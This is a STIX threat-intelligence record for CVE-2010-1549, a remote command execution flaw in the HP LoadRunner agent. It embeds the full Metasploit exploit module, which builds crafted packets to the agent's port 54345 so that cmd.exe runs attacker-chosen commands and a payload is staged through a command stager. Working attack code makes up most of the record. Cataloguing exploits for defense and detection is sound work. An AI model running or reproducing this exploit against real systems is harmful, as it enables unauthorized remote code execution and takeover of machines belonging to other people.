{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b8eaa4b1-b96c-4901-a15d-defc2b1c62e6",
    "created": "2024-08-14T16:46:51.563666Z",
    "modified": "2024-08-14T16:46:51.56367Z",
    "name": "\"HP Mercury LoadRunner Agent magentproc.exe Remote Command Execution\"",
    "description": " This module exploits a remote command execution vulnerablity in HP LoadRunner before 9.50 and also HP Performance Center before 9.50. HP LoadRunner 12.53 and other versions are also most likely vulneable if the (non-default) SSL option is turned off. By sending a specially crafted packet, an attacker can execute commands remotely. The service is vulnerable provided the Secure Channel feature is disabled (default).  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/hp_loadrunner_magentproc_cmdexec.rb",
            "external_id": "hp_loadrunner_magentproc_cmdexec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-1549"
        },
        {
            "source_name": "reference",
            "url": "https://support.hpe.com/hpsc/doc/public/display?docId=c00912968"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::CmdStager\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"HP Mercury LoadRunner Agent magentproc.exe Remote Command Execution\",\n      'Description'    => %q{\n        This module exploits a remote command execution vulnerablity in HP LoadRunner before 9.50\n        and also HP Performance Center before 9.50. HP LoadRunner 12.53 and other versions are\n        also most likely vulneable if the (non-default) SSL option is turned off.\n        By sending a specially crafted packet, an attacker can execute commands remotely.\n        The service is vulnerable provided the Secure Channel feature is disabled (default).\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Unknown', # Original discovery # From Tenable Network Security\n          'aushack'  # metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2010-1549'],\n          ['ZDI', '10-080'],\n          ['BID', '39965'],\n          ['URL', 'https://support.hpe.com/hpsc/doc/public/display?docId=c00912968']\n        ],\n      'Payload'        => { 'BadChars' => \"\\x0d\\x0a\\x00\" },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Note: software reportedly supports Linux - may also be vulnerable.\n          ['Windows (Dropper)',\n          'Platform'   => 'win',\n          'Arch'       => [ARCH_X86, ARCH_X64]\n          ],\n        ],\n      'Privileged'     => false,\n      'Stance'         => Msf::Exploit::Stance::Aggressive,\n      'DisclosureDate' => '2010-05-06',\n      'DefaultTarget'  => 0))\n\n      register_options([Opt::RPORT(54345)])\n  end\n\n  def autofilter\n    true\n  end\n\n  def execute_command(cmd, _opts = {})\n    guid = Rex::Text.encode_base64(Rex::Text.rand_text_alphanumeric(17))\n    randstr = Rex::Text.rand_text_alpha(16)\n    server_name = Rex::Text.rand_text_alpha(7)\n    server_ip = datastore['LHOST']\n    server_port = Rex::Text.rand_text_numeric(4)\n    # If linux is one day supported, cmd1 = /bin/sh and cmd2 = -c cmd\n    cmd1 = \"C:\\\\Windows\\\\system32\\\\cmd.exe\"\n    cmd2 = \"/C \\\"#{cmd}\\\"\"\n\n    pkt1 = [0x19].pack('N') + guid + '0'\n\n    pkt2 = [0x6].pack('N') + [0x0].pack('N') + \"(-server_type=8)(-server_name=#{server_name})(-server_full_name=#{server_name})\"\n    pkt2 << \"(-server_ip_name=#{server_ip})(-server_port=#{server_port})(-server_fd_secondary=4)(-guid_identifier=#{guid})\\x00\\x00\"\n    pkt2 << [0x7530].pack('N')\n\n    pkt3 = [4 + pkt2.length].pack('N') + pkt2\n\n    pkt4 = [0x1c].pack('N') + [0x05].pack('N') + [0x01].pack('N') + randstr + pkt3\n\n    pkt5 = [pkt4.length].pack('N') + pkt4\n\n    pkt6 = [0x437].pack('N') + [0x0].pack('N') + [0x31].pack('N') + [1].pack('N') + [0x31000000].pack('N')\n    pkt6 << [cmd1.length].pack('N') + cmd1 + \"\\x00\" + [cmd2.length].pack('N') + cmd2 + [0x0].pack('N') + [0x0].pack('N')\n\n    pkt7 = [4 + pkt6.length].pack('N') + pkt6\n\n    pkt8 = [0x18].pack('N') + [0x04].pack('N') + randstr + pkt7\n\n    pkt9 = [pkt8.length].pack('N') + pkt8\n\n    sploit = pkt1 + pkt5 + pkt9\n\n    connect\n    sock.put(sploit)\n    disconnect\n end\n\n  def exploit\n      print_status('Sending payload...')\n      execute_cmdstager(linemax: 1500)\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-05-06",
    "x_mitre_platforms": [
        "win'"
    ]
}